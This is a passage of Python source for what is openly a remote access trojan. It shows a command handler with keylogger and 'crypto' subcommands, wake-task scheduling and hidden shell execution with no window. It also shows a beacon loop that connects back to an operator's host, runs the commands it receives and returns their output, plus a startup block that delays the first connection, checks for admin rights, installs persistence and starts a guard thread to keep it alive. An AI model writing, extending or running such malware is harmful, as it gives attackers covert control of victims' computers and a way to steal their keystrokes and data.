        try:
            os.remove(_wake_flag())
        except OSError:
            pass
        return ("[+] wake disarmed\n").encode() + MARKER
    if low.startswith("wake in "):
        try:
            mins = int(float(low.split()[2]))
        except (ValueError, IndexError):
            return ("[!] usage: wake in <minutes>\n").encode() + MARKER
        if _register_wake_task(_persistence_exe(), max(1, mins),
                               highest=True):
            return ("[+] one-shot wake in %d min registered\n" % mins
                    ).encode() + MARKER
        return ("[!] task registration failed\n").encode() + MARKER
    if low == "sleep now":
        armed = _wake_armed()
        threading.Thread(target=_sleep_now, daemon=True).start()
        return ("[+] suspend initiated (wake hook armed: %s)\n" % armed
                ).encode() + MARKER
    if low == "power status":
        return (_power_status() + "\n").encode() + MARKER

    if low == "keylog" or low.startswith("keylog "):
        rest = cmd[len("keylog"):].strip()
        return (_keylog_cmd(rest) + "\n").encode() + MARKER
    if low == "crypto" or low.startswith("crypto "):
        rest = cmd[len("crypto"):].strip()
        return (_crypto_cmd(rest) + "\n").encode() + MARKER

    # Handle cd internally so the working directory persists between commands
    if cmd.lower() == "cd" or cmd.lower().startswith("cd "):
        try:
            path = cmd[2:].strip() or os.path.expanduser("~")
            path = os.path.expandvars(path)
            os.chdir(path)
            return f"{os.getcwd()}\n".encode() + MARKER
        except Exception as e:
            return f"[!] {e}\n".encode() + MARKER

    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            timeout=30,
            creationflags=subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0,
        )
        output = result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        output = b"[!] Command timed out."
    except Exception as e:
        output = f"[!] Error: {e}".encode()

    if os.name == "nt":
        try:
            output = output.decode("cp1252", errors="replace").encode("utf-8")
        except Exception:
            pass

    return output + MARKER


def _enable_tcp_keepalive(sock: socket.socket) -> None:
    """Keepalive so a silently-dead link (listener killed without RST,
    NAT/firewall dropping the mapping) cannot hang recv() forever: the OS
    probes the peer and force-closes the socket, which raises in recv() and
    lets the reconnect loop run. Probe after 15s idle, every 5s, 3 fails ->
    dead link detected within ~30s."""
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        if os.name == "nt":
            sock.ioctl(socket.SIO_KEEPALIVE_VALS, (1, 15000, 5000))
        else:
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 15)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 5)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 3)
    except OSError:
        pass


def connect() -> None:
    """Main loop - connect, execute commands, reconnect on failure.

    Runs forever: if the listener drops the session (clean close, reset, or a
    silently-dead link surfaced by TCP keepalive), the socket is closed and
    the beacon keeps retrying with a jittered backoff until the listener is
    back - then it stops retrying and serves normally.
    """
    delay = float(RECONNECT_DELAY)
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((LHOST, LPORT))
            _enable_tcp_keepalive(sock)
        except (ConnectionRefusedError, OSError):
            time.sleep(delay * random.uniform(0.75, 1.25))
            # back off gradually (cap 60s) so a down listener isn't hammered
            delay = min(delay * 1.5, 60.0)
            continue

        # connected: stop retrying, reset backoff for the next drop
        delay = float(RECONNECT_DELAY)

        try:
            while True:
                data = sock.recv(BUFFER)
                if not data:
                    break

                cmd = data.decode("utf-8", errors="replace").strip()
                if not cmd:
                    continue

                output = execute_command(cmd)
                sock.sendall(output)
        except (ConnectionResetError, OSError):
            pass
        finally:
            try:
                sock.close()
            except OSError:
                pass

        time.sleep(RECONNECT_DELAY)


if __name__ == "__main__":
    _enable_crash_log()   # crashes must leave evidence (no visible stderr)
    try:
        lo, hi = PRE_CONNECT_SLEEP
        if hi > 0 and os.environ.get("RAT_FAST") != "1":
            time.sleep(random.uniform(lo, hi))
    except Exception:
        pass
    try:
        import ctypes as _ct
        _is_admin = bool(_ct.windll.shell32.IsUserAnAdmin()) if os.name == "nt" else False
    except Exception:
        _is_admin = False
    _beacon_log("START src=%s elev=%s self=%s" % (
        os.environ.get("RAT_SOURCE", "0"), "1" if _is_admin else "0",
        get_self_path()))
    # Source mode (loader_py v3, RAT_SOURCE=1): the loader owns persistence
    # and feeds this script via stdin - skip self-install entirely.
    if os.environ.get("RAT_SOURCE") != "1":
        install_persistence()   # install + verified handoff on first run
        threading.Thread(target=_persistence_guard, daemon=True,
                         name=f"guard-{BUILD_ID[:8]}").start()
    _start_power_hook()   # WM_POWERBROADCAST watcher (suspend/resume)
    connect()